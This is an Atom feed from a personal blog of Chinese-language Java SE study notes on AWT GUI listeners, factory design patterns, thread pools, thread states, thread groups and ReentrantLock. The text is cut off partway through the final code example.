<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ather · Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://liuhaoan.github.io/"/>
  <updated>2019-04-10T11:08:43.698Z</updated>
  <id>http://liuhaoan.github.io/</id>
  
  <author>
    <name>Atcher</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javaSE复习之——GUI</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94GUI/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——GUI/</id>
    <published>2019-04-10T10:51:03.000Z</published>
    <updated>2019-04-10T11:08:43.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Gui的概述"><a href="#Gui的概述" class="headerlink" title="Gui的概述"></a>Gui的概述</h1><blockquote><p>它是一个图形用户接口</p></blockquote><h3 id="GUI的类"><a href="#GUI的类" class="headerlink" title="GUI的类"></a>GUI的类</h3><blockquote><p>Frame</p></blockquote><h3 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Frame f</span> = new Frame();</span><br></pre></td></tr></table></figure><p>ps：刚创建时不可见的</p><a id="more"></a><h3 id="Frame的方法："><a href="#Frame的方法：" class="headerlink" title="Frame的方法："></a>Frame的方法：</h3><ul><li>.setVisible()<blockquote><p>设置窗口是否可见</p></blockquote></li><li>.setSize(100,200)<blockquote><p>设置窗体大小</p></blockquote></li><li>.setLocation(500. 50)<blockquote><p>设置窗体位置</p></blockquote></li><li>.setIconImage(Toolkit.getDefaultToolKit().createImage(“1.png”))<blockquote><p>设置窗体图标</p></blockquote></li><li>.setLayout(new FlowLayout());<blockquote><p>设置布局管理器</p></blockquote></li></ul><h3 id="添加一个按钮："><a href="#添加一个按钮：" class="headerlink" title="添加一个按钮："></a>添加一个按钮：</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Button </span><span class="keyword">b1 </span>= new <span class="keyword">Button("按钮一");</span></span><br><span class="line"><span class="keyword">Button </span><span class="keyword">b2 </span>= new <span class="keyword">Button("按钮二");</span></span><br><span class="line"><span class="keyword">f.add(b1);</span>//向组件添加指定的弹出菜单</span><br><span class="line"><span class="symbol">f.add</span>(<span class="keyword">b2);</span></span><br></pre></td></tr></table></figure><h1 id="GUI布局管理器"><a href="#GUI布局管理器" class="headerlink" title="GUI布局管理器"></a>GUI布局管理器</h1><ul><li>FlowLayout（流式布局管理器）<blockquote><p>从左到右的顺序排列。<br>Panel默认的布局管理器。</p></blockquote></li><li>BorderLayout（边界布局管理器）<blockquote><p>东，南，西，北，中<br>Frame默认的布局管理器。</p></blockquote></li><li>GridLayout（网格布局管理器）<blockquote><p>规则的矩阵</p></blockquote></li><li>CardLayout（卡片布局管理器）<blockquote><p>选项卡</p></blockquote></li><li>GridBagLayout（网格包布局管理器）<blockquote><p>非规则的矩阵</p></blockquote></li></ul><h3 id="布局管理器类的一些常用方法"><a href="#布局管理器类的一些常用方法" class="headerlink" title="布局管理器类的一些常用方法"></a>布局管理器类的一些常用方法</h3><ul><li>.setEditable(booleam)<blockquote><p>设置这个布局是否可编辑</p></blockquote></li><li>.setBackground(Color.WHITE)<blockquote><p>设置背景颜色</p></blockquote></li><li>.setFont()    <blockquote><p>设置字体</p></blockquote></li></ul><h3 id="布局管理器常用类："><a href="#布局管理器常用类：" class="headerlink" title="布局管理器常用类："></a>布局管理器常用类：</h3><ul><li><p>Panel</p><blockquote><p>是最简单的容器类。应用程序可以将其他组件放在面板提供的空间内，这些组件包括其他面板。 </p></blockquote></li><li><p>TextField</p><blockquote><p>单行文本框</p></blockquote></li><li>TextArea<blockquote><p>多行文本框</p></blockquote></li></ul><h1 id="GUI窗体监听概述"><a href="#GUI窗体监听概述" class="headerlink" title="GUI窗体监听概述"></a>GUI窗体监听概述</h1><blockquote><p>用于接收窗口事件的侦听器接口，当通过<code>打开、关闭、激活或停用、图标化或取消图标化</code>而改变了窗口状态时，将调用该侦听器对象中的相关方法。</p></blockquote><h3 id="窗体监听接口"><a href="#窗体监听接口" class="headerlink" title="窗体监听接口"></a>窗体监听接口</h3><blockquote><p>WindowListener</p></blockquote><h3 id="窗口监听方法一"><a href="#窗口监听方法一" class="headerlink" title="窗口监听方法一"></a>窗口监听方法一</h3><ul><li><strong>使用创建类实现WindowListener接口并且重写方法实现，需要重写多个对象，并且还必须创建类，所以麻烦不推荐</strong><blockquote><p>1、创建一个类实现WindowListener接口</p><p>2、把WindowListener接口中每一个方法都重写</p><p>3、创建那个类的对象，然后调用f.addWindowListener方法传入这个对象。</p></blockquote></li></ul><h3 id="窗口监听方法二（直接传入一个匿名内部类）"><a href="#窗口监听方法二（直接传入一个匿名内部类）" class="headerlink" title="窗口监听方法二（直接传入一个匿名内部类）"></a>窗口监听方法二（直接传入一个匿名内部类）</h3><ul><li><p>ps</p><blockquote><p>WindowAdapter适配器实现并重写了WindowListener接口，我们只要继承它重写方法就可以只重写一个方法了。</p></blockquote></li><li><p>代码示例</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Frame f = new Frame(<span class="string">"我的窗体"</span>);</span><br><span class="line"><span class="regexp">//</span>事件源是窗体,把监听器注册到事件源上</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>事件对象传递给监听器</span><br><span class="line">f.addWindowListener(new WindowAdapter() &#123;</span><br><span class="line">          public void windowClosing(WindowEvent e) &#123;</span><br><span class="line">                     <span class="regexp">//</span>退出虚拟机,关闭窗口</span><br><span class="line">System.<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="GUI鼠标监听"><a href="#GUI鼠标监听" class="headerlink" title="GUI鼠标监听"></a>GUI鼠标监听</h1><ul><li><p>添加一个鼠标监听</p><blockquote><p>b1.addMouseListener（）</p></blockquote></li><li><p>鼠标监听接口</p><blockquote><p>MouseListener</p></blockquote></li><li><p>与窗体监听同理，他有一个适配器</p><blockquote><p>MouseAdapter</p></blockquote></li></ul><p>ps：创建鼠标监听与窗体监听同理，具体看api</p><h1 id="GUI键盘监听和键盘事件"><a href="#GUI键盘监听和键盘事件" class="headerlink" title="GUI键盘监听和键盘事件"></a>GUI键盘监听和键盘事件</h1><ul><li><p>添加一个键盘监听</p><blockquote><p>b1.addKeyListener（）</p></blockquote></li><li><p>键盘监听接口</p><blockquote><p>KeyListener</p></blockquote></li><li><p>与窗体监听同理，他有一个适配器</p><blockquote><p>KeyAdapter</p></blockquote></li></ul><p>ps：创建键盘监听与窗体监听同理，具体看api</p><p>ps：单独添加一个键盘监听的话，只要键盘按下任何键，程序都会执行重写方法中的代码</p><ul><li>KeyEvent类<blockquote><p>当我们按下某键时，会给监听器传入一个KeyEvent类，它是用户按下的某键</p></blockquote></li></ul><ul><li>代码示例</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b1.addKeyListener(new KeyAdapter() &#123;</span><br><span class="line">@Override</span><br><span class="line">public void keyReleased(KeyEvent e) &#123;</span><br><span class="line"><span class="regexp">//</span>System.<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="regexp">//</span>System.out.println(e.getKeyCode()); <span class="regexp">//</span>获取用户输入的按键代码</span><br><span class="line"><span class="regexp">//i</span>f(e.getKeyCode() == <span class="number">32</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(e.getKeyCode() == KeyEvent.VK_SPACE)&#123;<span class="regexp">//</span>KeyEvent.VK_SPACE为空格，它是个常量</span><br><span class="line">System.<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="GUI动作监听"><a href="#GUI动作监听" class="headerlink" title="GUI动作监听"></a>GUI动作监听</h1><ul><li><p>添加一个键盘监听</p><blockquote><p>b2.addActionListener（）</p></blockquote></li><li><p>键盘监听接口</p><blockquote><p>ActionListener</p></blockquote></li></ul><p>ps：因为这个接口只有一个方法，所以没有适配器，适配器只是为了在多方法接口中只重写一个方法</p><p>ps：创建键盘监听与窗体监听同理，具体看api</p><ul><li>应用场景<blockquote><p>暂停视频和播放视频</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Gui的概述&quot;&gt;&lt;a href=&quot;#Gui的概述&quot; class=&quot;headerlink&quot; title=&quot;Gui的概述&quot;&gt;&lt;/a&gt;Gui的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是一个图形用户接口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;GUI的类&quot;&gt;&lt;a href=&quot;#GUI的类&quot; class=&quot;headerlink&quot; title=&quot;GUI的类&quot;&gt;&lt;/a&gt;GUI的类&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Frame&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;创建一个窗口&quot;&gt;&lt;a href=&quot;#创建一个窗口&quot; class=&quot;headerlink&quot; title=&quot;创建一个窗口&quot;&gt;&lt;/a&gt;创建一个窗口&lt;/h3&gt;&lt;figure class=&quot;highlight ebnf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;Frame f&lt;/span&gt; = new Frame();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ps：刚创建时不可见的&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="GUI" scheme="http://liuhaoan.github.io/tags/GUI/"/>
    
      <category term="GUI布局管理器" scheme="http://liuhaoan.github.io/tags/GUI%E5%B8%83%E5%B1%80%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    
      <category term="GUI窗体监听" scheme="http://liuhaoan.github.io/tags/GUI%E7%AA%97%E4%BD%93%E7%9B%91%E5%90%AC/"/>
    
      <category term="GUI鼠标监听" scheme="http://liuhaoan.github.io/tags/GUI%E9%BC%A0%E6%A0%87%E7%9B%91%E5%90%AC/"/>
    
      <category term="GUI键盘监听" scheme="http://liuhaoan.github.io/tags/GUI%E9%94%AE%E7%9B%98%E7%9B%91%E5%90%AC/"/>
    
      <category term="GUI键盘事件" scheme="http://liuhaoan.github.io/tags/GUI%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/"/>
    
      <category term="GUI动作监听" scheme="http://liuhaoan.github.io/tags/GUI%E5%8A%A8%E4%BD%9C%E7%9B%91%E5%90%AC/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——设计模式_简单工厂与工厂方法模式</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E4%B8%8E%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——设计模式-简单工厂与工厂方法模式/</id>
    <published>2019-04-10T09:43:52.000Z</published>
    <updated>2019-04-10T09:48:15.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单工厂模式概述"><a href="#简单工厂模式概述" class="headerlink" title="简单工厂模式概述"></a>简单工厂模式概述</h1><blockquote><p>它又叫<strong>静态工厂方法模式</strong>，它定义一个具体的工厂类覅则创建一些类的实列</p></blockquote><ul><li><p>优点</p><blockquote><p>客户端不需要在负责对象的创建，从而明确了各个类的职责</p></blockquote></li><li><p>缺点</p><blockquote><p>这个静态工厂类负责所有对象的创建，如果有新的对象添加，或者某些对象创建方式不同，就需要不断修改工厂，不利于后期维护</p></blockquote></li></ul><a id="more"></a><h1 id="工厂方法模式概述"><a href="#工厂方法模式概述" class="headerlink" title="工厂方法模式概述"></a>工厂方法模式概述</h1><blockquote><p>工厂方法模式中，抽象工厂类类负责定义创建对象的接口，具体对象的创建工作由继承抽象工厂的具体类实现</p></blockquote><ul><li><p>优点</p><blockquote><p>客户端不需要再负责对象的创建，从而明确了各个类的职责，如果由新的对象增加，只需要增加一个具体的类和工厂即可，不影响已有的代码，增强了系统的维护性</p></blockquote></li><li><p>缺点</p><blockquote><p>需要额外写代码，增加了工作量</p></blockquote></li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DogFactory df = <span class="keyword">new</span> <span class="type">DogFactory</span>();</span><br><span class="line"><span class="comment">//DogFactory是实现工厂接口的工厂类</span></span><br><span class="line">Dog d = (Dog) df.createAnimal();</span><br><span class="line"><span class="comment">//调用工厂类重写的抽象方法中的createAnimal类来创建对象</span></span><br><span class="line">d.eat();</span><br></pre></td></tr></table></figure><h3 id="示例继承体系"><a href="#示例继承体系" class="headerlink" title="示例继承体系"></a>示例继承体系</h3><ul><li>Factory工厂接口    <blockquote><p>定义抽象方法createAnimal()</p><ul><li>DogFactory<br>重写方法createAnimal()，创建dog对象</li><li>CatFactory<br>重写方法createAnimal(),创建cat对象</li></ul></blockquote></li><li>Animal<ul><li>dog</li><li>cat</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简单工厂模式概述&quot;&gt;&lt;a href=&quot;#简单工厂模式概述&quot; class=&quot;headerlink&quot; title=&quot;简单工厂模式概述&quot;&gt;&lt;/a&gt;简单工厂模式概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它又叫&lt;strong&gt;静态工厂方法模式&lt;/strong&gt;，它定义一个具体的工厂类覅则创建一些类的实列&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;优点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;客户端不需要在负责对象的创建，从而明确了各个类的职责&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;缺点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个静态工厂类负责所有对象的创建，如果有新的对象添加，或者某些对象创建方式不同，就需要不断修改工厂，不利于后期维护&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="设计模式" scheme="http://liuhaoan.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="简单工厂模式" scheme="http://liuhaoan.github.io/tags/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="工厂方法模式" scheme="http://liuhaoan.github.io/tags/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——多线程_线程池</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-线程池/</id>
    <published>2019-04-10T09:38:29.000Z</published>
    <updated>2019-04-10T09:41:09.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="线程池的概述"><a href="#线程池的概述" class="headerlink" title="线程池的概述"></a>线程池的概述</h1><ul><li>一个形象的比喻：<blockquote><p>把很多线程全部养在一个池子里，要用就拿出来用，不用就放回去，还不会死掉的。这样就不用一直创建-死亡，因为线程的创建-死亡需要与计算机系统交互，这样的成本是很高的，用上线程池就可以很好的提高性能，尤其是程序中有很多生存周期短的线程。在jdk5之前必须手动创建线程池，jdk5之后java内置线程池</p></blockquote></li></ul><a id="more"></a><h3 id="jdk5新增了一个Executors工厂类来生产线程池，有如下几个方法："><a href="#jdk5新增了一个Executors工厂类来生产线程池，有如下几个方法：" class="headerlink" title="jdk5新增了一个Executors工厂类来生产线程池，有如下几个方法："></a>jdk5新增了一个Executors工厂类来生产线程池，有如下几个方法：</h3><ul><li>.newFixedTreadPool(int)<blockquote><p>创建一个线程池int传多少就是可以放多少线程</p></blockquote></li><li>.newSingleTreadExecutor()<blockquote><p>创建一个可以放一条线程的线程池</p></blockquote></li></ul><h3 id="线程池对象"><a href="#线程池对象" class="headerlink" title="线程池对象"></a>线程池对象</h3><blockquote><p>ExecutorService</p></blockquote><h3 id="ExecutorService线程池对象中的方法："><a href="#ExecutorService线程池对象中的方法：" class="headerlink" title="ExecutorService线程池对象中的方法："></a>ExecutorService线程池对象中的方法：</h3><ul><li>.submit(线程对象)<blockquote><p>把线程放入线程池中，并且执行</p></blockquote></li><li>.shutdown()<blockquote><p>关闭线程池</p></blockquote></li></ul><h3 id="创建线程池示例"><a href="#创建线程池示例" class="headerlink" title="创建线程池示例"></a>创建线程池示例</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecutorService es = Executors.<span class="keyword">new</span><span class="type">FixedTreadPool</span>(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;线程池的概述&quot;&gt;&lt;a href=&quot;#线程池的概述&quot; class=&quot;headerlink&quot; title=&quot;线程池的概述&quot;&gt;&lt;/a&gt;线程池的概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;一个形象的比喻：&lt;blockquote&gt;
&lt;p&gt;把很多线程全部养在一个池子里，要用就拿出来用，不用就放回去，还不会死掉的。这样就不用一直创建-死亡，因为线程的创建-死亡需要与计算机系统交互，这样的成本是很高的，用上线程池就可以很好的提高性能，尤其是程序中有很多生存周期短的线程。在jdk5之前必须手动创建线程池，jdk5之后java内置线程池&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="多线程" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="线程池" scheme="http://liuhaoan.github.io/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
      <category term="JDK5新特性Executors工厂类" scheme="http://liuhaoan.github.io/tags/JDK5%E6%96%B0%E7%89%B9%E6%80%A7Executors%E5%B7%A5%E5%8E%82%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——多线程_线程的5种状态</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E7%9A%845%E7%A7%8D%E7%8A%B6%E6%80%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-线程的5种状态/</id>
    <published>2019-04-10T09:35:32.000Z</published>
    <updated>2019-04-10T09:37:31.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ps：面试的时候可能会问"><a href="#ps：面试的时候可能会问" class="headerlink" title="ps：面试的时候可能会问"></a>ps：面试的时候可能会问</h1><p>1、新建，创建线程对象</p><p>2、就绪状态（执行了start开始命令，让他有了执行资格，但是因为cpu的机制没有执行权）</p><p>3、运行状态（抢到了cpu执行权）</p><p>4、阻塞状态（当运行时遇到了sleep或者wait进入睡眠，当睡眠结束又进入就绪状态）</p><p>5、死亡（线程执行完毕，线程对象变成了垃圾）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ps：面试的时候可能会问&quot;&gt;&lt;a href=&quot;#ps：面试的时候可能会问&quot; class=&quot;headerlink&quot; title=&quot;ps：面试的时候可能会问&quot;&gt;&lt;/a&gt;ps：面试的时候可能会问&lt;/h1&gt;&lt;p&gt;1、新建，创建线程对象&lt;/p&gt;
&lt;p&gt;2、就绪状态（执行了s
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="多线程" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="线程的5种状态面试题" scheme="http://liuhaoan.github.io/tags/%E7%BA%BF%E7%A8%8B%E7%9A%845%E7%A7%8D%E7%8A%B6%E6%80%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——多线程_线程组</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E7%BB%84/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-线程组/</id>
    <published>2019-04-10T09:33:09.000Z</published>
    <updated>2019-04-10T09:35:09.464Z</updated>
    
    <content type="html"><![CDATA[<h1 id="线程组的概述"><a href="#线程组的概述" class="headerlink" title="线程组的概述"></a>线程组的概述</h1><blockquote><p>它可以对一批线程进行分类管理，java允许程序直接对线程组进行控制</p></blockquote><h3 id="线程组的类"><a href="#线程组的类" class="headerlink" title="线程组的类"></a>线程组的类</h3><blockquote><p>ThreadGroup</p></blockquote><a id="more"></a><h3 id="线程组类中的方法"><a href="#线程组类中的方法" class="headerlink" title="线程组类中的方法"></a>线程组类中的方法</h3><ul><li>.getName()    <blockquote><p>通过线程组对象获取他组的名字，返回String，默认所属组为main主线程</p></blockquote></li></ul><h3 id="创建一个线程组"><a href="#创建一个线程组" class="headerlink" title="创建一个线程组"></a>创建一个线程组</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThreadGroup tg = <span class="keyword">new</span> <span class="type">ThreadGroup</span>(<span class="string">"线程组名称"</span>);</span><br><span class="line"><span class="comment">//不传入线程组名称则默认线程组为main主线程</span></span><br></pre></td></tr></table></figure><h3 id="创建一个线程并且放在某个组内"><a href="#创建一个线程并且放在某个组内" class="headerlink" title="创建一个线程并且放在某个组内"></a>创建一个线程并且放在某个组内</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Thread</span> t = <span class="keyword">new</span> <span class="keyword">Thread</span>(创建好的线程组，要创建线程的对象，线程名(可不填))<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="线程组的作用举例"><a href="#线程组的作用举例" class="headerlink" title="线程组的作用举例"></a>线程组的作用举例</h3><blockquote><p>当我们执行 tg.setDaemon(true) 设置成守护线程时，线程组内所有线程都被设置成了守护线程</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;线程组的概述&quot;&gt;&lt;a href=&quot;#线程组的概述&quot; class=&quot;headerlink&quot; title=&quot;线程组的概述&quot;&gt;&lt;/a&gt;线程组的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它可以对一批线程进行分类管理，java允许程序直接对线程组进行控制&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;线程组的类&quot;&gt;&lt;a href=&quot;#线程组的类&quot; class=&quot;headerlink&quot; title=&quot;线程组的类&quot;&gt;&lt;/a&gt;线程组的类&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;ThreadGroup&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="多线程" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="线程组" scheme="http://liuhaoan.github.io/tags/%E7%BA%BF%E7%A8%8B%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——多线程_JDK5新特性互斥锁</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%BA%92%E6%96%A5%E9%94%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-JDK5新特性互斥锁/</id>
    <published>2019-04-10T09:27:57.000Z</published>
    <updated>2019-04-10T09:32:15.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>它是锁（synchronized）的封装类，它更加的强大</p></blockquote><h3 id="互斥锁类"><a href="#互斥锁类" class="headerlink" title="互斥锁类"></a>互斥锁类</h3><blockquote><p>reentrantLock</p></blockquote><a id="more"></a><h3 id="监视器类"><a href="#监视器类" class="headerlink" title="监视器类"></a>监视器类</h3><blockquote><p>Condition（封装了一下Object中的监视器方法）</p></blockquote><h3 id="互斥锁方法"><a href="#互斥锁方法" class="headerlink" title="互斥锁方法"></a>互斥锁方法</h3><ul><li>.lock()<blockquote><p>获得一个锁</p></blockquote></li><li>.unlock()<blockquote><p>释放此锁</p></blockquote></li><li>.newCondition()<blockquote><p>获取一个Condition监视器对象，用来进行线程通信</p></blockquote></li></ul><h3 id="通过互斥锁线程通信示例"><a href="#通过互斥锁线程通信示例" class="headerlink" title="通过互斥锁线程通信示例"></a>通过互斥锁线程通信示例</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Printer3</span> &#123;</span><br><span class="line"><span class="keyword">private</span> ReentrantLock r = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="keyword">private</span> Condition c1 = r.newCondition();</span><br><span class="line"><span class="keyword">private</span> Condition c2 = r.newCondition();</span><br><span class="line"><span class="keyword">private</span> Condition c3 = r.newCondition();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print1</span>(<span class="params"></span>) throws InterruptedException</span> &#123;</span><br><span class="line">r.<span class="keyword">lock</span>();</span><br><span class="line"><span class="comment">//获取锁</span></span><br><span class="line"><span class="keyword">if</span>(flag != <span class="number">1</span>) &#123;</span><br><span class="line">c1.<span class="keyword">await</span>();</span><br><span class="line">&#125;</span><br><span class="line">System.<span 